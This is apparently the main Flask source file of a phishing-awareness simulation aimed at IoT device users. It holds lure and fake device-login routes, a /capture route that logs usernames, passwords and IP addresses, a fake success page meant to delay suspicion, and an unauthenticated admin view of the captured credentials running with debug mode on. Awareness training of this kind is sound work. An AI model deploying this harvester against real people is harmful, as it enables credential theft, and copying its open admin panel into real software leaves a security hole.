"""
IoT Phishing Attack Simulation — Main Flask Application
=========================================================
SET-Inspired educational simulation demonstrating social engineering
attacks targeting IoT device users.

⚠️  FOR EDUCATIONAL AND ACADEMIC PURPOSES ONLY
"""

from flask import Flask, render_template, request, redirect, url_for, session, flash
from config import SECRET_KEY, DEMO_MODE, SCENARIOS, HOST, PORT
from utils import log_credentials, get_client_ip, get_log_stats, clear_logs, generate_qr

app = Flask(__name__)
app.secret_key = SECRET_KEY


# ─────────────────────────────────────────────
#  ATTACKER-SIDE ROUTES
# ─────────────────────────────────────────────

@app.route('/panel')
def panel():
    """
    SET-style control panel for selecting attack scenario.
    This is the attacker's entry point — mirrors the SET Toolkit menu.
    """
    return render_template('panel.html', scenarios=SCENARIOS, demo=DEMO_MODE)


@app.route('/set-scenario/<scenario_id>')
def set_scenario(scenario_id):
    """Store selected scenario in session and redirect to lure page."""
    if scenario_id in SCENARIOS:
        session['scenario'] = scenario_id
    else:
        session['scenario'] = 'storage'
    return redirect(url_for('lure'))


# ─────────────────────────────────────────────
#  VICTIM-SIDE ROUTES
# ─────────────────────────────────────────────

@app.route('/')
def lure():
    """
    Social engineering lure page.
    Displays scenario-specific bait content designed to compel the victim
    to click through to the fake login page.
    """
    scenario_id = session.get('scenario', 'storage')
    scenario = SCENARIOS.get(scenario_id, SCENARIOS['storage'])
    return render_template('lure.html', scenario=scenario)


@app.route('/login')
def login():
    """
    Fake IoT device login portal.
    Mimics a realistic device management login page.
    """
    scenario_id = session.get('scenario', 'storage')
    scenario = SCENARIOS.get(scenario_id, SCENARIOS['storage'])
    return render_template('login.html', scenario=scenario, demo=DEMO_MODE)


@app.route('/capture', methods=['POST'])
def capture():
    """
    Capture submitted credentials.
    Logs username, password, timestamp, IP, and scenario to credentials.txt.
    Redirects to fake success page.
    """
    username = request.form.get('username', '').strip()[:100]
    password = request.form.get('password', '').strip()[:100]
    scenario_id = session.get('scenario', 'storage')
    ip = get_client_ip(request)

    # Basic validation — don't log empty submissions
    if username or password:
        log_credentials(username, password, scenario_id, ip, demo=DEMO_MODE)

    return redirect(url_for('success'))


@app.route('/success')
def success():
    """
    Fake success page shown briefly after credential capture.
    Auto-redirects to awareness page after 3 seconds.
    Prevents immediate suspicion from the victim.
    """
    scenario_id = session.get('scenario', 'storage')
    scenario = SCENARIOS.get(scenario_id, SCENARIOS['storage'])
    return render_template('success.html', scenario=scenario)


@app.route('/awareness')
def awareness():
    """
    Educational awareness page.
    Reveals the simulation and teaches the user about phishing,
    social engineering, and IoT security best practices.
    """
    scenario_id = session.get('scenario', 'storage')
    scenario = SCENARIOS.get(scenario_id, SCENARIOS['storage'])
    return render_template('awareness.html', scenario=scenario)


# ─────────────────────────────────────────────
#  ADMIN ROUTES
# ─────────────────────────────────────────────

@app.route('/admin')
def admin():
    """
    Admin dashboard displaying captured credentials and statistics.
    Shows total captures, per-scenario breakdown, and full log table.
    """
    stats = get_log_stats()
    return render_template('admin.html', stats=stats, demo=DEMO_MODE, scenarios=SCENARIOS)


@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    """Clear all captured credential logs."""
    clear_logs()
    flash('Credential logs cleared successfully.', 'success')
    return redirect(url_for('admin'))


# ─────────────────────────────────────────────
#  QR CODE ROUTE
# ─────────────────────────────────────────────

@app.route('/qrcode')
def qrcode_page():
    """
    Generate and display a QR code linking to the lure page.
    Useful for live demos where audience can scan to experience the simulation.
    """
    scenario_id = session.get('scenario', 'storage')
    lure_url = request.host_url.rstrip('/')
    qr_data = generate_qr(lure_url)
    return render_template('qrcode.html', qr_data=qr_data, lure_url=lure_url, scenario_id=scenario_id)


# ─────────────────────────────────────────────
#  APPLICATION ENTRY POINT
# ─────────────────────────────────────────────

if __name__ == '__main__':
    print("=" * 60)
    print("  IoT Phishing Attack Simulation")
    print("  ⚠️  FOR EDUCATIONAL PURPOSES ONLY")
    print(f"  Mode: {'DEMO (no file writes)' if DEMO_MODE else 'LIVE'}")
    print(f"  Running on: http://{HOST}:{PORT}")
    print("=" * 60)
    app.run(host=HOST, port=PORT, debug=True)
